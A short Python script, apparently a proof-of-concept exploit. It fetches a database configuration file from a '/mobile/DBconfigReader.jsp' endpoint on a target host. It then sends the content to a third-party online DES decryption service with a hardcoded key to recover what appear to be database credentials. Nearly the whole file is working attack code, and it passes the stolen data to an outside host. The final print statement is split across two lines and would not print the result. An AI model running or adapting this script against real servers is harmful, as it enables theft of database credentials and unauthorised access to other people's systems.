import base64
import requests
import ast


def req(url):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }

    r1 = requests.get(url, headers=headers).content
    s = r1.replace('\r\n', '')
    res1 = base64.b64encode(s)

    postdata = {
        'data': res1,
        'type': 'des',
        'arg': 'm=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1'
    }
    u = 'http://tool.chacuo.net/cryptdes'
    r2 = requests.post(u, data=postdata, headers=headers).content
    res2 = ast.literal_eval(r2)

    return res2['data']


url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp'
print
req(url)